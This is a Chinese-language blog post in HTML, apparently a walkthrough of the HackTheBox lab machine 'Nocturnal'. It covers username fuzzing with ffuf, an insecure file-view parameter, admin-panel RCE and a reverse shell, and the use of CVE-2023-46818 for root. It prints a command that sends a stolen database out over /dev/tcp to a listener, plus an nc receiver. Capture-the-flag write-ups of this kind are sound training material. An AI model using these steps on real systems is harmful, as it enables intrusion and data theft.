@@ -1,0 +1,110 @@
+<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>HTB-Nocturnal | workwork</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><link rel="preload" as="font" crossorigin="anonymous" href="/font/Bender.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/BenderLight.ttf"><link rel="preload" as="font" crossorigin="anonymous" href="/font/JetBrainsMono-Regular.woff2"><link rel="stylesheet" href="/css/arknights.css"><style>@font-face {
+  font-family: Bender;
+  src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
+}
+@font-face {
+  font-family: BenderLight;
+  src: local('BenderLight'), url("/font/BenderLight.ttf");
+}
+@font-face {
+  font-family: 'JetBrains Mono';
+  src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+</style><script>var config = {"root":"/","code_fold":15,"search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy"}}</script><link type="text/css" rel="stylesheet" href="/lib/encrypt/hbe.style.css"><script src="//unpkg.com/mermaid@10.5.0/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark')
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.woff2") format('woff2');
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+ --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+ --light-background: url('/img/bk.jpg');
+ --theme-encrypt-confirm: 'confirm'
+}</style><script defer src="/js/arknights.js"></script><script defer src="/js/search.js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@10.5.0/dist/mermaid.esm.mjs';
+window.mermaid = mermaid;
+code.paintMermaid();
+</script><script async src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script async src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script async src="/lib/encrypt/hbe.js"></script><script async src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js','data-pjax','.busuanzi'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>HTB-Nocturnal</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2025-04-19T06:40:52.000Z" id="date"> 2025-04-19</time></div></span><br><span>Last Update: <div class="control"><time datetime="2025-04-24T11:18:01.486Z" id="updated"> 2025-04-24</time></div></span></div></div><hr><div id="post-content"><p> 先使用nmap扫ip，得到22和80两个端口(虽然没什么用)，然后改hosts文件，将域名和ip绑定</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">echo &quot;address=/nocturnal.htb/10.10.11.64&quot; | sudo tee -a /etc/dnsmasq.conf<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>echo</code>：输出要添加的内容。</li>
+<li><code>tee -a</code>：以管理员权限追加到 <code>/etc/hosts</code>（避免覆盖原有内容）。</li>
+</ul>
+<p>接着访问域名进入网页，注册登录，是个上传文件的网页，上传文件得到下载链接，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://nocturnal.htb/view.php?username=111&amp;file=a.pdf<br></code></pre></td></tr></table></figure>
+
+<p>然后使用fuff爆有效用户名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ffuf -u &#x27;http://nocturnal.htb/view.php?username=FUZZ&amp;file=a.pdf&#x27; -w /home/Desktop/htb/user.txt -H &#x27;Cookie: PHPSESSID=k381a2of6lftuk6gnab5f5sapa&#x27;  -fs 2985<br></code></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>-u</code></td>
+<td align="left">目标URL，其中 <code>FUZZ</code> 是占位符，表示要爆破的变量位置。</td>
+</tr>
+<tr>
+<td align="left"><code>-w</code></td>
+<td align="left">指定字典文件路径（这里是 <code>user.txt</code>，用于替换 <code>FUZZ</code>）。</td>
+</tr>
+<tr>
+<td align="left"><code>-H</code></td>
+<td align="left">添加HTTP请求头（此处传递了一个Cookie，可能是维持会话所必需）。</td>
+</tr>
+<tr>
+<td align="left"><code>-fs 2985</code></td>
+<td align="left">过滤掉响应大小为2985字节的结果（通常用于排除无效响应）。</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">root                  [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 644ms]<br>admin                 [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 683ms]<br>1                     [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration:1548ms]<br>amanda                [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 675ms]<br>tobias                [Status: 200, Size: 3037, Words: 1174, Lines: 129, Duration: 685ms]<br></code></pre></td></tr></table></figure>
+
+<p>将下载链接中username&#x3D;111替换为username&#x3D;amanda(其他不行)，得到privacy.odt，是word文件，找到password，接着登录amanda，左上角链接进入admin后台，点击admin.php发现有任意rce(看wp发现的)，使用shell文件反弹，其他反弹试了不行，接着找到.db数据库文件，下载到kali</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">www-data@nocturnal:~/nocturnal_database$ cat nocturnal_database.db &gt; /dev/tcp/10.xx.xx.xx/8888<br><br>[root@kali] /home/kali/Nocturnal  <br>❯ nc -lvnp 8888 &gt; nocturnal_database.db<br></code></pre></td></tr></table></figure>
+
+<p>得到了 账号密码，第一个flag，切换用户后，目录下有.txt就是flag，密码是md5加密后的，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">su tobias<br></code></pre></td></tr></table></figure>
+
+<p>输入<code>ps -aux</code>和<code>netstat -tuln</code>收集信息，发现靶机8080端口存在</p>
+<p>在kali输入<code>ssh -L 9000:127.0.0.1:8080 tobias@10.10.11.64</code>讲8080端口页面转发到本地，查看页面<br>发现是一个ispconfig页面，查看源代码，可以得知版本号应该为v3.2</p>
+<p>搜索一下ispconfig 3.2 exploit，发现存在CVE-2023-46818可以利用，但是该漏洞利用需要能登录的用户名和密码，只能尝试密码复用<br>将exploit下载到本地并执行，发现成功执行并获取到root权限，到此便已经通关该靶场</p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2025/04/01/%E8%BF%99%E6%98%AF%E4%BB%80%E4%B9%88SQL%E6%B3%A8%E4%B8%80%E4%B8%8B/">这是什么SQL注一下 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo" style="margin:0;border-radius:0;"></a><h1 id="Dr"><a href="/">heyi404</a></h1><div id="description"><p></p></div></div><div id="aside-block"></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>
